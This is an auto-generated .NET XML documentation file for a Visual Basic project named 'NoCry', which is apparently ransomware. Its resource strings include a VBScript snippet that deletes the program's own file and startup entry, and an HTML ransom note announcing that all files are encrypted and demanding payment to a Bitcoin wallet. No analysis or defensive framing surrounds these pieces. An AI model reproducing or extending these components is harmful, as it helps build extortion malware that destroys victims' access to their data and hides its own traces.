﻿<?xml version="1.0"?>
<doc>
<assembly>
<name>
NoCry
</name>
</assembly>
<members>
<member name="T:NoCry.My.Resources.Resources">
<summary>
  A strongly-typed resource class, for looking up localized strings, etc.
</summary>
</member>
<member name="P:NoCry.My.Resources.Resources.ResourceManager">
<summary>
  Returns the cached ResourceManager instance used by this class.
</summary>
</member>
<member name="P:NoCry.My.Resources.Resources.Culture">
<summary>
  Overrides the current thread's CurrentUICulture property for all
  resource lookups using this strongly typed resource class.
</summary>
</member>
<member name="P:NoCry.My.Resources.Resources.background">
<summary>
  Looks up a localized resource of type System.Drawing.Bitmap.
</summary>
</member>
<member name="P:NoCry.My.Resources.Resources.bitcoin">
<summary>
  Looks up a localized resource of type System.Drawing.Bitmap.
</summary>
</member>
<member name="P:NoCry.My.Resources.Resources.del">
<summary>
  Looks up a localized string similar to On Error Resume Next
WScript.Sleep 2900
CreateObject(&quot;Scripting.FileSystemObject&quot;).DeleteFile(&quot;%path%&quot;)
CreateObject(&quot;Scripting.FileSystemObject&quot;).DeleteFile(&quot;%startup%&quot;).
</summary>
</member>
<member name="P:NoCry.My.Resources.Resources.html">
<summary>
  Looks up a localized string similar to &lt;!DOCTYPE html&gt; 
&lt;html&gt; 
    &lt;body style=&quot;background-color:#800000;&quot;&gt;
   &lt;/body&gt;
  
&lt;body&gt; 

&lt;center&gt;
  &lt;br&gt;
    &lt;br&gt;
    &lt;font size=&quot;6&quot;
          face=&quot;verdana&quot;
          color=&quot;#FFFFFF&quot;&gt; 
         Ooooops All Your Files Are Encrypted ,NoCry
        &lt;/font&gt; 
    &lt;br&gt; 
  &lt;br&gt;

    &lt;font size=&quot;5&quot;
          face=&quot;arial&quot; 
          color=&quot;#FFFFFF&quot;&gt; 
            Send %M% To The Wallet : %BTC%
        &lt;/font&gt; 
    &lt;br&gt; 
  &lt;br&gt;

    &lt;font size=&quot;5&quot;
          color=&quot;#FFFFFF&quot;&gt; 
           [rest of string was truncated]&quot;;.
</summary>
</member>
<member name="P:NoCry.My.Resources.Resources.key">
<summary>
  Looks up a localized resource of type System.Drawing.Bitmap.
</summary>
</member>
<member name="P:NoCry.My.Resources.Resources.Pic1">
<summary>
  Looks up a localized resource of type System.Drawing.Bitmap.
</summary>
</member>
</members>
</doc>
